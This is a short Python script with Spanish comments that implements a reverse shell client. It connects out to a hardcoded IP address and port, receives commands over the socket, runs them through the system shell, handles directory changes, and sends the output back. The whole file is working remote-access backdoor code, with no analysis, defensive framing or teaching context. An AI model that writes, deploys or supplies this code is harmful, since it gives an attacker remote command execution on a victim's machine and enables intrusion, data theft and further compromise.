import socket
import subprocess
import os

def main():
    host = '192.168.1.138'  # Cambia esto por la dirección IP del servidor
    port = 12345  # Puerto en el que el servidor está escuchando

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            elif command.startswith('cd '):
                directory = command.split(' ', 1)[1]
                try:
                    os.chdir(directory)
                    output = f"Cambiado al directorio: {os.getcwd()}"
                except Exception as e:
                    output = str(e)
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except Exception as e:
                    output = str(e).encode()
            if isinstance(output, bytes):
                try:
                    output = output.decode('utf-8')
                except UnicodeDecodeError:
                    output = output.decode('latin-1')
            s.sendall(output.encode())




if __name__ == "__main__":
    main()
